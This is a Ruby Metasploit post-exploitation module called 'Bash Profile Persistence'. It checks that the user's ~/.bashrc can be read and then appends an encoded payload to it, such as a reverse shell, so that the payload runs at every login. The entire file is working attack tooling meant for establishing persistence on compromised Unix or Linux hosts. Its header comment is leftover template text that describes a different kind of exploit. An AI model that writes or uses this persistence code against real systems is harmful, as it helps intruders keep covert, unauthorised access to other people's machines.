##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary TCP server.
#
###
class MetasploitModule < Msf::Exploit::Local
    Rank = ExcellentRanking
  
    include Msf::Post::File
    include Msf::Post::Unix

  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name'           => 'Bash Profile Persistence',
          'Description'    => %q(
            This module writes a persistent ASCII payload (such as a python reverse shell) to the
            current user's Bash profile file. Payload executes
            on user login.
          ),
          'License'        => MSF_LICENSE,
          'Author'         =>
            [
              'Michael Long <bluesentinel[at]protonmail.com'
            ],
          'DisclosureDate' => 'XXXXXXXX',
          'Platform'       => ['unix', 'linux'],
          'Arch'           => ARCH_CMD,
          'SessionTypes'   => ['shell', 'meterpreter'],
          'Targets'        =>
            [
              ['Automatic', {}]
            ],

          'DefaultTarget'  => 0,
          'References'     =>
          [
            ['URL', 'https://attack.mitre.org/techniques/T1156/']
          ]
        )
    )

      register_options(
        [
          OptString.new('PROFILE_PATH', [true, 'Bash Profile Path','~/.bashrc'])
        ], self.class
    )
    end
  
    def exploit
      canAccessFile = checkFileAccess(datastore['PROFILE_PATH'])
      if canAccessFile == false
        #print_error("Verify the file path is correct and confirm you have appropriate permissions.")
        fail_with Failure::NotFound, datastore['PROFILE_PATH']
      end
    
    
      writePersistence(datastore['PROFILE_PATH'], payload.encoded)
      print_good("Wrote persistent payload to Bash profile.")
      
      #handler
    end

    def checkFileAccess(bashProfilePath)
      fileExists = readable?(bashProfilePath)
      if fileExists == false
        return false
      end
      return true
    end
    
    def writePersistence(bashProfilePath, payloadString)
      append_file(bashProfilePath, payloadString)
    end
  end
  